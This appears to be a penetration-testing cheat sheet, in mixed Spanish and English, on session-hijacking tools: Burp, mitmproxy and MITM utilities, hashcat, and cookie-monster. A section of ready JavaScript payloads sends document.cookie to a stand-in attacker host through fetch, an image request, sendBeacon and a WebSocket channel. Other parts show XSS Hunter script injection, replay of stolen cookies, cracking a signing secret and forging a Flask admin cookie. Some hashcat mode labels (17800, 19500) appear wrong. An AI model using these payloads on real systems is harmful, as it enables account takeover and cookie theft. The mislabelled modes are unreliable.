---
aliases:
  - Burp Session Handling
  - mitmproxy Cookie
  - Wireshark Cookie Capture
tags:
  - type/cheatsheet
  - vuln/session-hijacking
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Session Hijacking]]'
  - '[[Burp Suite]]'
  - '[[hashcat]]'
---
# Session Hijacking - Tooling

***

## Burp Session Handling Rules

| **Función** | **Acción** | **Notas** |
|:---:|:---:|:---:|
| Settings → Sessions | Configure session handling rules | Built-in. |
| Cookie jar | Burp manages cookies automatically | Standard. |
| Session handling rules | Per-tool / per-URL behavior | Customizable. |
| Add custom cookies | Manually inject session cookies | Reuse stolen. |
| Macros for re-auth | Auto-relogin if session expires | Long sessions. |
| Macro chain login → request | Multi-step session refresh | Complex. |
| Cookie tampering | Modify cookies en Repeater | Standard. |
| Burp Comparer | Diff cookies between requests | Manual. |
| Burp Sequencer | Analyze cookie randomness | Predictable detection. |
| Burp Decoder | Decode encoded cookies (base64, etc) | Manual analysis. |
| Project options → connections | Persistent connections per profile | Per-target. |
| Session handling for multiple users | Per-tool different cookies | Multi-user testing. |
^sh-tool-burp

### Burp Sequencer for cookie analysis

```
1. Burp → Sequencer → Live capture
2. Configure target: select Cookie value parameter
3. Start capture (collect ~100+ samples)
4. Analyze:
   - Bit-level entropy
   - Char frequency
   - Pattern detection
5. If entropy < 64 bits → vulnerable
```

___

## mitmproxy / Wireshark

| **Tool** | **Comando / Setup** | **Notas** |
|:---:|:---:|:---:|
| mitmproxy | `mitmproxy -p 8080` | Interactive HTTPS proxy. |
| mitmweb | Web UI alternative | Easier UI. |
| mitmproxy capture cookies | Auto-logged in flows | Visible. |
| mitmproxy modify cookies | Inline modify | Standard. |
| mitmproxy script | Python scripts for automation | Programmable. |
| Wireshark | Network packet capture | Standard sniffer. |
| Wireshark filter cookies | `http.cookie contains "session"` | Filter. |
| Wireshark TLS decrypt | Pre-master secret needed | Limited. |
| tcpdump | CLI capture | Raw. |
| ngrep | Pattern grep en network | Quick filter. |
| Burp Proxy alternative | Burp también captures + modifies | Standard. |
| ZAP | OWASP ZAP free alt | Standard. |
| sslsplit | Active MITM HTTPS | Tool. |
| bettercap | All-in-one MITM | Modern. |
| Ettercap | Legacy MITM | Old but functional. |
| Combine con SSLstrip | Downgrade attack | Pre-HSTS only. |
^sh-tool-mitm

___

## Custom JS Exfil Payloads

| **Payload** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| `fetch('//attacker/?c=' + document.cookie)` | Standard | Quick. |
| `new Image().src='//attacker/?c='+document.cookie` | Image-based exfil | Common. |
| `navigator.sendBeacon('//attacker', document.cookie)` | Async fire-and-forget | Modern. |
| `fetch('/api/data', {credentials:'include'})` then exfil | Read auth'd response | Indirect cookie access. |
| WebSocket exfil channel | `new WebSocket('wss://attacker/c2')` | Real-time C2. |
| Service Worker register + intercept | Persistence + man-in-the-middle | Modern. |
| postMessage broadcast | Cross-frame exfil | Edge. |
| localStorage scrape | `JSON.stringify(localStorage)` | If storage used. |
| IndexedDB scrape | More complex | Rare. |
| BroadcastChannel | Same-origin | Limited. |
| Form submit to attacker | `<form action="//attacker">` auto-submit | Sin JS scenarios. |
| CSS exfil | Limited but exists | No-JS. |
| Combine con XSS Hunter | Centralized capture | Standard tooling. |
| BeEF (Browser Exploitation Framework) | Persistent browser hook | Advanced. |
^sh-tool-jspayload

### XSS Hunter setup

```
1. Sign up xsshunter.com or self-host (XSSHunter Express)
2. Receive unique <id>.xss.ht URL
3. Inject payload: <script src="https://<id>.xss.ht"></script>
4. Wait for victim trigger
5. Dashboard auto-captures:
   - URL
   - Cookies (non-HttpOnly)
   - DOM snapshot
   - Browser fingerprint
   - IP / User-Agent
6. Replay captured cookies en Burp
```

___

## cookie-monster / Cookieless

| **Tool** | **Uso** | **Notas** |
|:---:|:---:|:---:|
| cookie-monster (CLI) | https://github.com/iangcarroll/cookiemonster | Detect signed cookies + crack. |
| Run | `cookiemonster -cookie 'session=...'` | Detection. |
| Crack mode | `cookiemonster -cookie '...' -wordlist rockyou.txt` | Brute. |
| Express cookie-session detect | Auto-detects format | Standard. |
| Flask session detect | Same | Same. |
| Rails cookie detect | Same | Same. |
| Java Spring detect | Same | Java. |
| Hashcat compatible output | Save crack hash | Standard. |
| Cookieless | Browser session cookies extractor | Local. |
| Browser cookie databases | `~/.config/google-chrome/Default/Cookies` | Local file. |
| Custom Python decode | Per-format cookie format | Manual. |
^sh-tool-cookie-monster

### cookie-monster workflow

```bash
# 1. Identify framework cookie
COOKIE='session=eyJ.....SIGNATURE'
cookiemonster -cookie "$COOKIE"
# Output: detected as Flask, signed with HS256

# 2. Crack signing secret
cookiemonster -cookie "$COOKIE" -wordlist rockyou.txt
# Output: secret found = 'changeme'

# 3. Forge new cookie con cracked secret
python3 -c "
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer('changeme')
print(s.dumps({'_user_id': 1, 'is_admin': True}))
"
```

___

## Hashcat para Signed Cookies

| **Mode** | **Cookie format** | **Notas** |
|:---:|:---:|:---:|
| `-m 16500` | JWT HS256 | Standard JWT. |
| `-m 19500` | Flask session | Specific. |
| `-m 17800` | Keras session (Python) | Edge. |
| Custom mode | Express, Rails-specific | Per-app. |
| Convert cookie → hashcat format | Tool-specific | Per-format. |
| Combine con rockyou + rules | `-r best64.rule` | Comprehensive. |
| Mask attack | `-a 3 ?l?l?l?l?l?l?l?l` | Charset-specific. |
| GPU acceleration | RTX 3090+ | Speed. |
| Distributed cracking | hashtopolis / similar | Scale. |
| Combine con hashcat-utils | maskprocessor para custom masks | Power. |
| `--show` after crack | Display result | Standard. |
^sh-tool-hashcat

***
